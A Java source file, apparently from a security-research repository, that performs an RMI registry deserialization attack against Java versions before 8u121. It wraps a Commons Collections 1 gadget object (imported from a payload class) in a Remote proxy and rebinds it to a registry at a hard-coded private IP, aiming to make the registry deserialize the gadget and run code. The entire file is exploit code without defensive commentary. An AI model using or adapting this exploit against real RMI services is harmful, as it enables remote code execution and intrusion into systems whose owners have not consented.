package org.example.exploit.before8u121;

import org.example.payload.CC1;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.net.MalformedURLException;
import java.rmi.Naming;
import java.rmi.Remote;
import java.rmi.RemoteException;

public class CC1AtackRegister  {
    public static void main(String[] args) throws RemoteException, MalformedURLException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException {
        InvocationHandler evalObject  = (InvocationHandler) CC1.getObject();
        Remote proxyEvalObject = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, evalObject);
        String host = "rmi://192.168.110.146:1099/";
        Naming.rebind(host+"CC1", proxyEvalObject);
    }
}
